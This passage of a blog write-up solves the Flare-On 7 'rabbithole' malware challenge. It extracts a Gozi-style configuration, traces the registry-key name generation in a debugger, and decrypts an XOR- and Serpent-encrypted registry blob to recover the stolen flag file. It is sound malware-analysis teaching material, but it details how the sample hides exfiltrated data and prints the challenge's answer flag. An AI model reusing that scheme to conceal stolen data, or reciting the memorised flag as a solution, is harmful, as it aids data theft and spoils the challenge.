+<p>Alright, so what&rsquo;s next? Since most of the decrypted outputs are PX modules, let&rsquo;s try to narrow it down to those which are not, by grepping for all <code>.dec</code> files that don&rsquo;t start with &ldquo;PX&rdquo;.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ grep --include<span class="o">=</span><span class="se">\*</span>.dec -Lre <span class="s1">&#39;^PX&#39;</span> .
+./WordTimer/MAIN.dec
+./Languagetheme/MonitornewWarningmap.dec
+</code></pre></div><p>Okay, seems like we have only two results: <code>MAIN</code> and <code>MonitornewWarningmap</code>. We already know <code>MAIN</code>, but what is the second file?</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ strings ./Languagetheme/MonitornewWarningmap.dec
+https://glory.to.kazohinia
+curlmyip.net
+GSPyrv3C79ZbR0k1
+<span class="m">1000</span>
+no-cache, no-store, must-revalidate
+<span class="m">300000</span>
+30, 8, notipda
+</code></pre></div><p>By no doubt, this looks like some kind of a configuration. A quick look at articles online confirms it, this is how parts of Gozi&rsquo;s configuration looks like. Moreover, the challenge description clearly states that &ldquo;The malware is - without doubt - an APT that is the ingenious work of the Cyber Army of the Republic of Kazohinia.&rdquo;. Seeing <code>https://glory.to.kazohinia</code> in the strings, confirm that we are in the right direction.</p>
+<p>So we have a bunch of PX modules, one file that contains &ldquo;flag.txt&rdquo; and another one that is a configuration file. We try really hard to avoid the rabbit hole here, we are VERY close to start reconstructing the PX files and dive into reversing them. All we are left with are the files that we were not able to decrypt. Could one of them contain the stolen file with the flag? Let&rsquo;s list them and sort them by size:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="m">233</span> kb  D.bin
+<span class="m">208</span> b   DiMap.bin
+ <span class="m">40</span> b   SolutionDat.bin
+ <span class="m">36</span> b   SoftwareColumn.bin
+ <span class="m">12</span> b   FalseLanguage.bin
+  <span class="m">8</span> b   CalTimer.bin
+  <span class="m">8</span> b   DatNew.bin
+  <span class="m">8</span> b   DayOld.bin
+  <span class="m">8</span> b   CurrentByte.bin
+  <span class="m">8</span> b   ThemeDay.bin
+  <span class="m">4</span> b   ScreenWeb.bin
+  <span class="m">4</span> b   VersiScreen.bin
+  <span class="m">4</span> b   WebFalse.bin
+  <span class="m">4</span> b   ScaleThr.bin
+  <span class="m">4</span> b   TimerVersion.bin
+</code></pre></div><p>Oh, this is helpful! We can safely remove 11 out of the 15 files as they are simply too small. remember, <code>@flare-on.com</code> alone is 13 bytes long. In addition, we know that <code>D.bin</code> is the <code>D</code> key that holds the Powershell script, we can remove it from the list as well. This leaves us with 3 files that are bigger than 13 chars and unknown to us. Let&rsquo;s have a look at them.</p>
+<p>The smallest of them is <code>SoftwareColumn.bin</code> which has 36 bytes, pretty small for a flag.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ cat SoftwareColumn.bin 
+no-cache, no-store, must-revalidate
+</code></pre></div><p>Nope, not this one. Next one is <code>SolutionDat.bin</code> with length of 40 bytes — can it contain the flag?</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ xxd SolutionDat.bin 
+00000000: <span class="m">3556</span> 0a0c <span class="m">5080</span> <span class="m">0000</span> <span class="m">9480</span> 2baf c73a ef8f  5V..P.....+..:..
+00000010: cad9 3b6e 7b93 d297 <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>  ..<span class="p">;</span>n<span class="o">{</span>...........
+00000020: <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span> <span class="m">0000</span>                      ........
+</code></pre></div><p>It doesn&rsquo;t look like it can. A big chunk of this file is null bytes, including a pair of null bytes that split a sequence of non-null values. This one probably does not contain the flag.</p>
+<p>Finally, this leaves us with <code>DiMap.bin</code>. Can it be the file that contains the flag?</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ xxd DiMap.bin 
+00000000: 040c <span class="m">0181</span> e185 1fef 8d89 0fab 13a6 a264  ...............d
+00000010: eff5 44b7 10d0 a8f5 731f 9cff 069f fc23  ..D.....s......#
+00000020: 084a 113a 923c 5f51 <span class="m">7170</span> 9bd0 769f 50e7  .J.:.&lt;_Qqp..v.P.
+00000030: 11a7 22ce 48c7 f369 <span class="m">7872</span> 1ca2 05b6 f231  ..<span class="s2">&#34;.H..ixr.....1
+</span><span class="s2">00000040: a5a4 baa6 f371 e061 4bad 5566 ba34 4fa0  .....q.aK.Uf.4O.
+</span><span class="s2">00000050: 4937 e6ef 5857 5607 b2fb 1363 bcc2 0be3  I7..XWV....c....
+</span><span class="s2">00000060: d291 f7b7 1a76 6a42 e3e8 2f09 312f 4fe2  .....vjB../.1/O.
+</span><span class="s2">00000070: 9144 54ef c78c 2335 0d25 f1e1 3880 14b7  .DT...#5.%..8...
+</span><span class="s2">00000080: f27c 5538 2a9b b411 d063 1f24 2890 f1f3  .|U8*....c.</span><span class="k">$(</span>...
+00000090: e7c8 <span class="m">7446</span> 02ea 66ce 1ba9 71cc 1b12 b397  ..tF..f...q.....
+000000a0: 9e05 8b19 <span class="m">0473</span> 1f83 e5d7 daf9 <span class="m">0583</span> f571  .....s.........q
+000000b0: 70d4 59c2 1fd7 d47e 6e77 1ac3 58cb b934  p.Y....~nw..X..4
+000000c0: 1c81 73c9 dea9 649a 6efd 0fe2 c33d c3a3  ..s...d.n....<span class="o">=</span>..
+</code></pre></div><p>Absolutely yes! This looks like an encrypted/compressed file with very high entropy and no null bytes at all. It is indeed a candidate to contain the stolen file and the flag.</p>
+<h2 id="decrypting-dimap">Decrypting DiMap</h2>
+<p>How can we decrypt it? We were not able to extract a Serpent key out of it, and we didn&rsquo;t see &ldquo;DiMap&rdquo; generated yet. That said, we tried really hard to avoid anything that smells like a rabbit hole, so we only executed the program until the first module was decrypted, we didn&rsquo;t let it run now under the <code>explorer.exe</code> process name. Can we find when the <code>DiMap</code> name is generated and used to store an encrypted file, <code>flag.txt</code> maybe? Well, it worth a try.</p>
+<p>What we want to do now, is to let the program run and print the registry key names it generates until it generates <code>DiMap</code>. Then, we would like to see if we can find how this registry key is used. That is, if a buffer is written to the <code>DiMap</code> registry key, and how this buffer was encrypted. To do this, we can set a conditional breakpoint right after a name is generated. We already mentioned that names are generated using the SID and XorShift in the function at <code>0x14001021C</code>. We can put the following conditional breakpoint at offset <code>0x140010243</code>.</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Read a UTF-16 string pointed by RAX</span>
+<span class="n">name</span> <span class="o">=</span> <span class="n">get_strlit_contents</span><span class="p">(</span><span class="n">get_reg_value</span><span class="p">(</span><span class="s2">&#34;rax&#34;</span><span class="p">),</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">STRTYPE_C_16</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;Generated name: {name}&#34;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">name</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;DiMap&#34;</span><span class="p">:</span>
+   <span class="k">print</span><span class="p">(</span><span class="s2">&#34;STOP EVERYTHING! :O&#34;</span><span class="p">)</span>
+   
+   <span class="c1"># Returning 1 will stop the execution</span>
+   <span class="k">return</span> <span class="mi">1</span>
+</code></pre></div><p>Now we can run the program and observe it printing generated names. We can cross our fingers that <code>DiMap</code> will eventually be generated and pause the execution.</p>
+<div class="details admonition warning open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-exclamation-triangle fa-fw"></i>Warning<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>During the execution, we noticed that the program is branching out and hanging after the third module (<code>RowmapGuiprotocol</code>) is loaded. We simply changed the instruction pointer to force it to branch right and continue the execution. This might happen in your environment as well, and it as well may not.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="images/image_21.png"
+        data-srcset="/posts/flare-on-7-rabbithole/images/image_21.png, images/image_21.png 1.5x, /posts/flare-on-7-rabbithole/images/image_21.png 2x"
+        data-sizes="auto"
+        alt="/posts/flare-on-7-rabbithole/images/image_21.png"
+        title="/posts/flare-on-7-rabbithole/images/image_21.png" /></p>
+</div>
+        </div>
+    </div>
+<p>We press the play button and crossing our fingers hard, maybe too hard, until eventually — the program stops! We reached the name generation of <code>DiMap</code>!</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;Timerpro&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;Languagetheme&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;Columncurrent&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;WebsoftwareProcesstemplate&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;RowmapGuiprotocol&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;WordlibSystemser&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;WebmodeThemearchive&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;SolutionDat&#39;</span>
+<span class="o">...</span> <span class="n">TRUNCATED</span> <span class="n">FOR</span> <span class="n">READABILITY</span> <span class="o">...</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;Columncurrent&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;PrintsolutSavetheme&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;Columncurrent&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;ThemespellDaytheme&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;NewFalse&#39;</span>
+<span class="n">Generated</span> <span class="n">name</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;DiMap&#39;</span>
+<span class="n">STOP</span> <span class="n">EVERYTHING</span><span class="err">!</span> <span class="p">:</span><span class="n">O</span>
+</code></pre></div><p>The execution paused at our breakpoint. Tracing back the stack leads us to the function which is responsible to trigger this flow. We called it <code>Generate_DiMap</code>. As can be seen in the snippet below, the function is rather simple and contains calls to two functions. One of them, the latter, is a call to a function that generates <code>DiMap</code> and writes a buffer to the <code>DiMap</code> registry key. The first call is unknown to us as we stopped after it. Maybe this is the function that is responsible to encrypt the buffer before saving it to the registry.</p>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">func</span> <span class="no">Generate_DiMap</span>
+    <span class="err">0</span><span class="nf">x1E4BB3</span> <span class="no">push</span>  <span class="no">rax</span>
+    <span class="err">0</span><span class="nf">x1E4BB4</span> <span class="no">sub</span>   <span class="no">rsp</span><span class="p">,</span> <span class="mi">20</span><span class="no">h</span>
+    <span class="err">0</span><span class="nf">x1E4BB8</span> <span class="no">mov</span>   <span class="no">rdi</span><span class="p">,</span> <span class="p">[</span><span class="no">r12</span><span class="err">+</span><span class="mi">18</span><span class="no">h</span><span class="p">]</span>
+    <span class="err">0</span><span class="nf">x1E4BBD</span> <span class="no">mov</span>   <span class="no">ebx</span><span class="p">,</span> <span class="p">[</span><span class="no">r12</span><span class="err">+</span><span class="mi">28</span><span class="no">h</span><span class="p">]</span>
+    <span class="err">0</span><span class="nf">x1E4BC2</span> <span class="no">xor</span>   <span class="no">r9</span><span class="p">,</span> <span class="no">r9</span>
+    <span class="err">0</span><span class="nf">x1E4BC5</span> <span class="no">mov</span>   <span class="no">rax</span><span class="p">,</span> <span class="no">cs</span><span class="p">:</span><span class="no">qword_1E6070</span>
+    <span class="err">0</span><span class="nf">x1E4BCC</span> <span class="no">mov</span>   <span class="no">r8d</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span><span class="err">+</span><span class="mi">78</span><span class="no">h</span><span class="p">]</span>
+    <span class="err">0</span><span class="nf">x1E4BD1</span> <span class="no">mov</span>   <span class="no">rdx</span><span class="p">,</span> <span class="no">rbx</span>
+    <span class="err">0</span><span class="nf">x1E4BD4</span> <span class="no">mov</span>   <span class="no">rcx</span><span class="p">,</span> <span class="no">rdi</span>
+    <span class="err">0</span><span class="nf">x1E4BD7</span> <span class="no">mov</span>   <span class="no">rax</span><span class="p">,</span> <span class="no">cs</span><span class="p">:</span><span class="no">off_1E52D8</span>
+    <span class="err">0</span><span class="nf">x1E4BDE</span> <span class="no">sub</span>   <span class="no">ax</span><span class="p">,</span> <span class="mi">454</span><span class="no">h</span>
+
+    <span class="err">0</span><span class="nf">x1E4BE2</span> <span class="no">call</span>  <span class="no">rax</span> <span class="c">; qword_1E4E84
+</span><span class="c"></span>
+    <span class="err">0</span><span class="nf">x1E4BE4</span> <span class="no">mov</span>   <span class="no">r9</span><span class="p">,</span> <span class="no">rbx</span>
+    <span class="err">0</span><span class="nf">x1E4BE7</span> <span class="no">mov</span>   <span class="no">r8</span><span class="p">,</span> <span class="no">rdi</span>
+    <span class="err">0</span><span class="nf">x1E4BEA</span> <span class="no">mov</span>   <span class="no">dl</span><span class="p">,</span> <span class="mi">3</span>
+    <span class="err">0</span><span class="nf">x1E4BEC</span> <span class="no">mov</span>   <span class="no">cl</span><span class="p">,</span> <span class="mi">7</span><span class="no">Fh</span>
+    <span class="err">0</span><span class="nf">x1E4BEE</span> <span class="no">mov</span>   <span class="no">ch</span><span class="p">,</span> <span class="no">cl</span>
+
+    <span class="err">0</span><span class="nf">x1E4BF0</span> <span class="no">call</span>  <span class="no">generate_name_and_set_registry_value</span>
+    
+    <span class="err">0</span><span class="nf">x1E4BF5</span> <span class="no">mov</span>   <span class="no">edi</span><span class="p">,</span> <span class="mi">24924925</span><span class="no">h</span>
+    <span class="err">0</span><span class="nf">x1E4BFA</span> <span class="no">add</span>   <span class="no">rsp</span><span class="p">,</span> <span class="mi">20</span><span class="no">h</span>
+    <span class="err">0</span><span class="nf">x1E4BFE</span> <span class="no">pop</span>   <span class="no">rax</span>
+    <span class="err">0</span><span class="nf">x1E4BFF</span> <span class="no">retn</span>
+</code></pre></div><p>Let&rsquo;s set a breakpoint at the beginning of <code>Generate_DiMap</code> and run the program again. This time, we will enter the first call to <code>rax</code>. Running the program once again, we are now stopped at <code>0x1E4BE2</code>, just before <code>DiMap</code> name is generated. Stepping into the <code>call</code> we see a <code>jmp</code> instruction to a function in <code>0x1C542C</code> that looks familiar. Too familiar. The function we have just arrived at looks like the reversed function of the XOR decryption function we implemented at the beginning of the analysis (<code>xor_decrypt_data</code>). In fact, this looks like the encryption function that was responsible for XOR encrypting the data. We can safely assume that this is a rolling XOR encryption function so let&rsquo;s name it <code>xor_encrypt_data</code>. Note, that if you will check the leaked source code, you will also find a pair of XOR encryption and decryption function which will look similar (but not an exact match) to our own pair of functions.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_22.png" title="/posts/flare-on-7-rabbithole/images/image_22.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_22.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_22.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_22.png, images/image_22.png 1.5x, /posts/flare-on-7-rabbithole/images/image_22.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_22.png" />
+    </a>
+<p>Inspecting the function arguments, we can see that it gets a buffer and a key, exactly like the decryption function we saw and implemented at the beginning. The key that is used is <code>0xFB307BFA</code>, and the buffer looks like nothing. It looks like the buffer before the encryption is already encrypted. Weird.</p>
+<a class="lightgallery" href="/posts/flare-on-7-rabbithole/images/image_23.png" title="/posts/flare-on-7-rabbithole/images/image_23.png" data-thumbnail="/posts/flare-on-7-rabbithole/images/image_23.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="images/image_23.png"
+            data-srcset="/posts/flare-on-7-rabbithole/images/image_23.png, images/image_23.png 1.5x, /posts/flare-on-7-rabbithole/images/image_23.png 2x"
+            data-sizes="auto"
+            alt="/posts/flare-on-7-rabbithole/images/image_23.png" />
+    </a>
+<p>The buffer to be encrypted by <code>xor_encrypt_data</code></p>
+<p>We don&rsquo;t know what data was sent to this encryption function, because we didn&rsquo;t follow the flow of the program to get the context. That said, we do know that this encryption routine is performed on the data just before it is written to <code>DiMap</code>. As such, it makes sense to give it a try and use the decryption function we implemented earlier, to try and decrypt <code>DiMap</code>. Let&rsquo;s give it a try:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># The generated key</span>
+<span class="n">key</span> <span class="o">=</span> <span class="mh">0xFB307BFA</span>
+<span class="c1"># Read DiMap from the file we extracted from the registry</span>
+<span class="n">encrypted_buffer</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;keys/Timerpro/DiMap.bin&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="c1"># Use the xor_decrypt_data function we implemented before</span>
+<span class="n">xor_decrypted</span> <span class="o">=</span> <span class="n">xor_decrypt_data</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">xor_decrypted</span><span class="p">)</span>
+
+<span class="c1"># results:</span>
+<span class="c1"># b&#39;\xfew1z\xf9!\xefR\x96w \xbfCF\xd5I\x06(\xd6([\xe0\xc5\x9d\x99\xb4\x04\xf1\xf2\xb8\...[truncated]...\x81\xa7\xf1\xf21\x8f,\x9cHT\x89\xd7{\x8b\xdb\xfeF\xc0|&lt;\xc9\xbe1\xfa\x06\x8a3u\x82J/[\x83{\xb5\xcb\xaf&#39;</span>
+</code></pre></div><p>Oh&hellip; this did not work as we expected. After executing the <code>xor_decrypt_data</code> on <code>DiMap</code> we still got a meaningless output — not the flag we wished for. We know for sure that the buffer that is sent to the encryption function is saved to the <code>DiMap</code> registry key, but the results we got are disappointed. We probably need to look further back into the flow of the program. After all, even when we debugged and paused before arriving at the encryption function, the data looked encrypted/compressed. What if an encryption or compression function was called before? Let&rsquo;s go back to our debugger and inspect the flow once again.</p>
+<p>When we went back to IDA, we noticed that something interesting was printed to the output window. It was one of the conditional breakpoints we put earlier on <code>0x14000CDDF</code>, that prints the used Serpent keys for us. It printed a Serpent key to the screen, right before <code>Generate_DiMap</code> was called. And this key looks exactly like a string we saw in the decrypted <code>MonitornewWarningmap</code> file.</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="n">Serpent</span> <span class="n">key</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;GSPyrv3C79ZbR0k1&#39;</span>
+</code></pre></div><p>Was the result of <code>xor_decrypt_data</code> encrypted with another layer of Serpent encryption? We can look even more backward, and see where did the buffer come from before it was sent to the XOR encryption function. If we can find a call to a Serpent encryption function that encrypts the data before passing it forward, then we just might have the right key printed for us. So let&rsquo;s look at what functions are called before calling <code>Generate_DiMap</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="na">...</span>
+<span class="err">0</span><span class="nf">x1E1157</span> <span class="no">call</span>    <span class="no">cs</span><span class="p">:</span><span class="no">w_SerpentEncrypt</span>  <span class="c">; Encrypt a buffer using Serpent
+</span><span class="c"></span><span class="mi">0x1E115D</span> <span class="no">lock</span> <span class="no">add</span> <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">r13</span><span class="err">+</span><span class="mi">0</span><span class="no">E0h</span><span class="p">],</span> <span class="mi">0</span><span class="no">FFFFFFFFh</span>
+<span class="err">0</span><span class="nf">x1E1166</span> <span class="no">cmp</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">esi</span>
+<span class="err">0</span><span class="nf">x1E1168</span> <span class="no">jnz</span>     <span class="no">short</span> <span class="no">loc_1E11E8</span>
+<span class="err">0</span><span class="nf">x1E116A</span> <span class="no">lea</span>     <span class="no">ecx</span><span class="p">,</span> <span class="p">[</span><span class="no">rsi</span><span class="err">+</span><span class="mi">77</span><span class="no">h</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x1E116D</span> <span class="no">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">r12</span><span class="err">+</span><span class="mi">2</span><span class="no">Ch</span><span class="p">],</span> <span class="mi">1</span>
+<span class="err">0</span><span class="nf">x1E1176</span> <span class="no">call</span>    <span class="no">j_w_RtlAllocateHeap</span>  <span class="c">; &lt;-- Allocate heap
+</span><span class="c"></span><span class="mi">0x1E117B</span> <span class="no">cmp</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">rsi</span>
+<span class="err">0</span><span class="nf">x1E117E</span> <span class="no">mov</span>     <span class="no">rbp</span><span class="p">,</span> <span class="no">rax</span>
+<span class="err">0</span><span class="nf">x1E1181</span> <span class="no">jz</span>      <span class="no">short</span> <span class="no">loc_1E11E8</span>
+<span class="err">0</span><span class="nf">x1E1183</span> <span class="no">call</span>    <span class="no">cs</span><span class="p">:</span><span class="no">off_1E5008</span>
+<span class="err">0</span><span class="nf">x1E1189</span> <span class="no">call</span>    <span class="no">Generate_DiMap</span>  <span class="c">; &lt;-- XOR Encrypt, generate DiMap name and set registry
+</span><span class="c"></span><span class="no">...</span>
+</code></pre></div><p>Yes! It looks like a Serpent encryption function was called just before encrypting a buffer using XOR and setting the results in the <code>DiMap</code> registry key. This explains several things:</p>
+<ol>
+<li>Why we saw a buffer that looks encrypted even before it went through the XOR encryption</li>
+<li>When we used <code>xor_decrypt_data</code> we still got encrypted results</li>
+<li>We saw a Serpent key (<code>GSPyrv3C79ZbR0k1</code>) that was printed to the screen right before our program paused.</li>
+</ol>
+<p>If true, then it means that the content of <code>DiMap</code> was encrypted like this:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># [PSEUDO]</span>
+<span class="n">xor_encrypt_date</span><span class="p">(</span><span class="n">serpent_encrypt</span><span class="p">(</span><span class="s2">&#34;GSPyrv3C79ZbR0k1&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">),</span> <span class="mh">0xFB307BFA</span><span class="p">)</span>
+</code></pre></div><p>This means, that in order to decrypt the encrypted <code>DiMap</code> we need to perform the reversed process and hope for the best:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># [PSEUDO]</span>
+<span class="n">serpent_decrypt</span><span class="p">(</span><span class="s2">&#34;GSPyrv3C79ZbR0k1&#34;</span><span class="p">,</span> <span class="n">xor_decrypt_date</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">,</span> <span class="mh">0xFB307BFA</span><span class="p">))</span>
+</code></pre></div><p>Having this information, we can try to add another decryption layer to our Python code and decrypt the results of <code>xor_decrypt_data</code> with Serpent. Crossing our fingers.</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">malduck</span> <span class="kn">import</span> <span class="n">chunks</span><span class="p">,</span> <span class="n">rol</span><span class="p">,</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span><span class="p">,</span> <span class="n">serpent</span>
+
+<span class="k">def</span> <span class="nf">xor_decrypt_data</span> <span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">rol_value</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">prev</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">decrypted_buffer</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">()</span>
+
+    <span class="k">for</span> <span class="n">dword</span> <span class="ow">in</span> <span class="n">chunks</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">,</span> <span class="mi">4</span><span class="p">):</span>
+        <span class="n">temp</span> <span class="o">=</span> <span class="n">prev</span> <span class="o">^</span> <span class="n">u32</span><span class="p">(</span><span class="n">dword</span><span class="p">)</span> <span class="o">^</span> <span class="n">key</span>
+        <span class="n">decrypted_buffer</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">rol</span><span class="p">(</span><span class="n">temp</span><span class="p">,</span> <span class="n">rol_value</span> <span class="o">*</span> <span class="mi">4</span><span class="p">))</span>
+        <span class="n">rol_value</span> <span class="o">^=</span> <span class="mi">1</span>
+        <span class="n">prev</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">dword</span><span class="p">)</span>
+    
+    <span class="k">return</span> <span class="n">decrypted_buffer</span>
+
+<span class="c1"># The generated keys</span>
+<span class="n">xor_key</span> <span class="o">=</span> <span class="mh">0xFB307BFA</span>
+<span class="n">serpent_key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;GSPyrv3C79ZbR0k1&#34;</span>
+
+<span class="c1"># Read the encrypted file extracted from the DiMap registry key</span>
+<span class="n">encrypted_buffer</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;keys/Timerpro/DiMap.bin&#34;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="c1"># First layer of decryption</span>
+<span class="n">xor_decrypted</span> <span class="o">=</span> <span class="n">xor_decrypt_data</span><span class="p">(</span><span class="n">encrypted_buffer</span><span class="p">,</span> <span class="n">xor_key</span><span class="p">)</span>
+
+<span class="c1"># Second layer of decryption</span>
+<span class="n">results</span> <span class="o">=</span> <span class="n">serpent</span><span class="o">.</span><span class="n">cbc</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">serpent_key</span><span class="p">,</span> <span class="n">xor_decrypted</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">results</span><span class="p">)</span>
+</code></pre></div><p>Results:</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="sa">b</span><span class="s1">&#39;PK</span><span class="se">\x03\x04\x14\x00\x00\x08\x08\x00\x00\x00\x00\x00\x1e\x8c\xe3</span><span class="s1">`/</span><span class="se">\x00\x00\x00</span><span class="s1">*</span><span class="se">\x00\x00\x00\x1e\x00\x00\x00</span><span class="s1">C/Users/Kevin/Desktop/flag.txt</span><span class="se">\x01</span><span class="s1">*</span><span class="se">\x00\xd5\xff</span><span class="s1">r4d1x_m4l0rum_357_cup1d1745@flare-on.com</span><span class="se">\r\n</span><span class="s1">PK</span><span class="se">\x01\x02\x00\x00\x14\x00\x00\x08\x08\x00\x00\x00\x00\x00\x1e\x8c\xe3</span><span class="s1">`/</span><span class="se">\x00\x00\x00</span><span class="s1">*</span><span class="se">\x00\x00\x00\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s1">C/Users/Kevin/Desktop/flag.txtPK</span><span class="se">\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00</span><span class="s1">L</span><span class="se">\x00\x00\x00</span><span class="s1">k</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s1">&#39;</span>
+</code></pre></div><p><strong>Amazing!</strong> We were able to decrypt <code>DiMap</code> and got the flag inside a ZIP file. We literally can see the full flag inside the printed contents. When extracted, we can see the stolen <code>flag.txt</code> file:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ cat C/Users/Kevin/Desktop/flag.txt 
+r4d1x_m4l0rum_357_cup1d1745@flare-on.com
+</code></pre></div><h2 id="summary">Summary</h2>
+<p>During this write up we tried hard not to enter the rabbit hole. The idea behind avoiding these noises is that we can stay focused and less frustrated during the challenge and always be sure that we are going forward towards the flag. In this final writeup, we demonstrated that it is possible to solve this challenge without analyzing Gozi modules and with little to no knowledge about this popular malware. We tried to avoid using the source code during both the analysis and the write-up so we can all learn how to approach such a challenge even when the source code and other articles aren&rsquo;t available to us.</p>
+<p>As this is a very long article, many interesting things and tricks, as well as different observations were left out. We hope that you were able to learn from the things that made their way into this text.</p>
+<p>FIN.</p>
+<hr>
+<h2 id="appendix">Appendix</h2>
+<ol>
+<li><a href="/posts/flare-on-7-rabbithole/dump_registry.py" rel="">dump_registry.py</a></li>
+<li><a href="/posts/flare-on-7-rabbithole/decrypt_modules.py" rel="">decrypt_modules.py</a></li>
+</ol>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-10-23</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/flare-on/">flare-on</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
